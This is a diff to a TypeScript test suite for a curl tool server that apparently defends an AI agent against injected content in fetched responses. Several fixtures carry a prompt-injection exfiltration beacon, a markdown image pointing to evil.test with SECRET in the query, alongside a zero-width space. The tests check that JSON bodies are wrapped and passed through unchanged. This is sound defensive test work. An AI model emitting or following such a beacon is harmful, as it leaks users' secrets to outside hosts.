@@ -24,6 +24,7 @@ import { DEFAULT_USER_AGENT } from "../config/index.js";
 // `curl-output.test-fixture.ts` — so this is what ties it to the contract.
 import type { CommandResult } from "../execution/index.js";
 import { clearInjectionDetectionMap } from "../security/detection-logger.js";
+import { isWrappedResult } from "../response/index.js";
 
 // The real separator length, not a short stand-in: the metadata search window
 // is sized from it, so a shorter mock hides margin the production path lacks.
@@ -197,23 +198,26 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // registering tools unwrapped, `docs/todos/006`) is invisible to any
     // assertion about the markup.
     //
-    // So the witness is an invisible codepoint, which Step 2 removes and an
-    // absent wrap leaves. The beacon beside it is the CONTROL: it must survive,
-    // because stripping it inside a JSON document is what `LESSONS.md` RC-47
-    // removed and RC-49 closed for good.
+    // So the witness is the wrap's own tag, which only `createWrapper` sets and
+    // an absent wrap leaves off. The body beside it is the CONTROL: byte for
+    // byte, an invisible codepoint and a beacon included, because a JSON
+    // payload is the agent's and not this server's to rewrite (`LESSONS.md`
+    // RC-49). Were the body ever to reach the strip arm, the beacon would go.
     // ---------------------------------------------------------------------
     it("runs the wrap over an application/json body without rewriting its values", async () => {
         const body = `{"note":"a${ZWSP}b ![x](https://evil.test/?d=SECRET)"}`;
         mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
         const handlers = registerViaShippedPath();
-        const text = textOf(await handlers.get("curl_execute")!(params({}), { sessionId: undefined }));
+        const result = await handlers.get("curl_execute")!(params({}), { sessionId: undefined });
+        const text = textOf(result);
 
         // The wrap ran.
-        expect(text).not.toContain(ZWSP);
-        // And returned the value verbatim otherwise. RC-10 reversed on this path.
+        expect(isWrappedResult(result)).toBe(true);
+        // And returned the value verbatim: the codepoint and the beacon both stay.
+        expect(text).toContain(ZWSP);
         expect(text).toContain("evil.test");
-        expect(text).toBe(body.replace(ZWSP, ""));
+        expect(text).toBe(body);
     });
 
     // ---------------------------------------------------------------------
@@ -301,14 +305,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // come back intact and still wrapped.
     // ---------------------------------------------------------------------
     describe("depth cannot switch the defence off", () => {
-        // **A zero-width space is what makes these cases able to fail**, and
-        // without it a byte comparison would pass on the very fail-open they
-        // exist to catch: the original defect returned the body UNTOUCHED and
-        // tagged as wrapped, which is byte-identical to a correct pass-through.
-        //
-        // Step 2 removes this codepoint and the strip stages do not run on a
-        // JSON body, so the pair separates the two things cleanly — the ZWSP
-        // going means the wrap ran, the beacon staying means it did not rewrite.
+        // **The failure these cases catch is a depth at which the JSON arm is
+        // lost.** Were `classifyBody` to stop recognising a deeply nested
+        // document, the wrap would send it down the strip arm, which removes the
+        // beacon and the invisible codepoint — so byte-identity, both included,
+        // fails on exactly that. The tag says the wrap ran at all.
         const ZWSP = "\u200b";
         const nested = (depth: number) =>
             "[".repeat(depth) +
@@ -320,19 +321,16 @@ describe("registerAllTools — the shipped binary's registration path", () => {
                 const body = nested(depth);
                 mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
                 const handlers = registerViaShippedPath();
-                const text = textOf(
-                    await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
-                );
+                const result = await handlers.get("curl_execute")!(params({}), {
+                    sessionId: undefined,
+                });
+                const text = textOf(result);
 
-                // The wrap ran: Step 2 took the invisible codepoint out. Nothing
-                // else on this path removes it, so its absence is the proof.
-                expect(text).not.toContain(ZWSP);
-                // It did NOT rewrite: the beacon is remote string content in a
-                // JSON value and 018 returns it verbatim. RC-10 reversed here.
+                expect(isWrappedResult(result)).toBe(true);
+                // Byte for byte, at every depth: the JSON arm held.
+                expect(text).toContain(ZWSP);
                 expect(text).toContain("evil.test");
-                // And everything else is byte for byte — no walk, so no depth at
-                // which one aborts and returns the body unprocessed.
-                expect(text).toBe(body.replace(ZWSP, ""));
+                expect(text).toBe(body);
             });
         }
     });
@@ -483,8 +481,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             // The fix must WIDEN the defence over this arm, not exempt the
             // channel: defending the body early and then skipping the wrap would
             // pass every fidelity assertion above while letting the pass go
-            // missing. After 018 the proof is the invisible codepoint rather
-            // than the beacon, since the beacon is now returned by design.
+            // missing. The proof is the wrap's tag, since the body itself is
+            // returned byte for byte by design.
             const body = `{"n":"a${ZWSP}b ![x](https://evil.test/?d=SECRET)"}`;
             mockedExecuteCommand.mockResolvedValue(
                 curlOutput(body, "application/json", HEADER_BLOCK)
@@ -497,9 +495,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
             const text = textOf(result);
 
-            expect(text).not.toContain(ZWSP);
-            expect(text).toContain("evil.test");
-            expect(text).toBe(body.replace(ZWSP, ""));
+            expect(isWrappedResult(result)).toBe(true);
+            expect(text).toBe(body);
             // The header text is its own entry, so nothing paired across the join.
             expect((result as { content: unknown[] }).content).toHaveLength(2);
         });
@@ -626,8 +623,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(text).toContain("9223372036854775807");
         });
 
-        // The beacon strip must still fire on a document carrying raw numbers —
-        // the markers must not become a way to skip the defence.
+        // A document carrying raw numbers must still pass through the wrap —
+        // the markers must not become a way to skip it.
         it("keeps a raw number's spelling and still runs the wrap", async () => {
             // The number markers cannot become a way to skip the defence,
             // because nothing walks the graph. The assertions are that the wide
@@ -636,13 +633,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
-            );
+            const result = await handlers.get("curl_execute")!(params({}), { sessionId: undefined });
+            const text = textOf(result);
 
-            expect(text).not.toContain(ZWSP);
+            expect(isWrappedResult(result)).toBe(true);
             expect(text).toContain("9223372036854775807");
-            expect(text).toBe(body.replace(ZWSP, ""));
+            expect(text).toBe(body);
         });
 
         it("keeps a __proto__ field inside a nested document leaf", async () => {
@@ -858,7 +854,16 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             // octets and no defence pass grows a JSON body, so a reported count
             // below the limit it says was exceeded is not constructible.
             expect(reported).toBeGreaterThanOrEqual(limit);
-            expect(text).toContain("once the inline defence pass is applied");
+            // No defence pass runs on a JSON body, so the message names none.
+            expect(text).not.toContain("defence pass");
+            // **The saved file is the answer; a narrower request is for next
+            // time.** On a rate-limited API a re-request spends quota the bytes
+            // already on disk do not, so the order of these two is the contract.
+            const analyse = text.indexOf("The saved file is valid to analyse.");
+            const narrow = text.indexOf("narrow the next request");
+            expect(analyse).toBeGreaterThan(-1);
+            expect(narrow).toBeGreaterThan(analyse);
+            expect(text).toContain("Use the jq_query tool on that path");
         });
 
     });
